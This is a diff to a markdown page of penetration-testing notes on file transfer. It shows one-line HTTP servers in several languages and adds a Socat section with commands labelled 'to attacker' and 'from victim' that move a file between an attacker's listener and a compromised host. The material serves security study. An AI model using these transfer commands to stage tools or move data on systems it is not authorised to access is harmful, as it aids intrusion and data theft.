@@ -4,7 +4,7 @@ Not much here yet...please feel free to contribute at [https://www.github.com/zw
 
 ## Simple HTTP Servers
 
-```text
+```
 python2 -m SimpleHTTPServer $port
 python3 -m http.server $port
 ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 8888, :DocumentRoot => Dir.pwd).start"
@@ -13,7 +13,7 @@ php -S 0.0.0.0:8888
 
 ## Python HTTP server
 
-TODO: add --help to python file sharing scripts \(issue [\#14](https://github.com/zweilosec/Infosec-Notes/issues/14)\)
+TODO: add --help to python file sharing scripts (issue [#14](https://github.com/zweilosec/Infosec-Notes/issues/14))
 
 * Add argument parsing capability
 * add `--help` argument for getting usage description
@@ -142,5 +142,15 @@ if __name__ == '__main__':
     main()
 ```
 
-If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
+## Socat
 
+```bash
+#to attacker
+sudo socat TCP4-LISTEN:$port:fork file:$file_name
+#from victim
+socat TCP4:$IP:$port file:$filename,create
+```
+
+`sudo` is necessary if the port is under 1024. `fork` allows for multiple connections.
+
+If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
